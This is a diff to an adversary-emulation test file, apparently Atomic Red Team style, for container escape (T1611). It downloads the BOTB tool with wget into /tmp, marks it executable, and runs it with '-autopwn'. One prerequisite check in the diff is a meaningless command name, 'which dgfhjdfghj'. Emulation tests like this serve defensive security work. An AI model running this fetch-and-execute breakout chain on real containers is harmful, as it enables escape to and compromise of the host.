@@ -1,4 +1,4 @@
-attack_technique: DOWNLOAD_BOTB
+attack_technique: T1611
 display_name: Download Malware
 atomic_tests:
 - name: Download the BOTB malware to a container
@@ -10,12 +10,12 @@ atomic_tests:
   - description: |
       Checks for wget
     prereq_command: |
-      which wget
+      which dgfhjdfghj
     get_prereq_command: |
-      Write-Host "No wget found"
+      echo "No wget found"
   executor:
     command: |
-      wget -nv https://github.com/brompwnie/botb/releases/download/1.8.0/botb-linux-amd64 -O /tmp/botb
+      wget -nv https://github.com/brompwnie/botb/releases/download/1.8.0/botb-linux-amd64 -O /tmp/botb 
     name: sh
     elevation_required: false
 - name: Chmod +x the downloaded botb malware
@@ -27,9 +27,9 @@ atomic_tests:
   - description: |
       Checks for wget
     prereq_command: |
-      [ -e /tmp/botb ]
+      [ -d /tmp ]
     get_prereq_command: |
-      Write-Host "No /tmp/botb found"
+      echo "No /tmp found"
   executor:
     command: |
       chmod +x /tmp/botb 
@@ -42,11 +42,11 @@ atomic_tests:
   - containers
   dependencies:
   - description: |
-      Checks for existence of /tmp/botb
+      Checks for existence of /tmp
     prereq_command: |
-      [ -x /tmp/botb ]
+      [ -d /tmp ]
     get_prereq_command: |
-      Write-Host "/tmp/botb not executable or not found"
+      echo "/tmp not found"
   executor:
     command: |
       /tmp/botb -autopwn
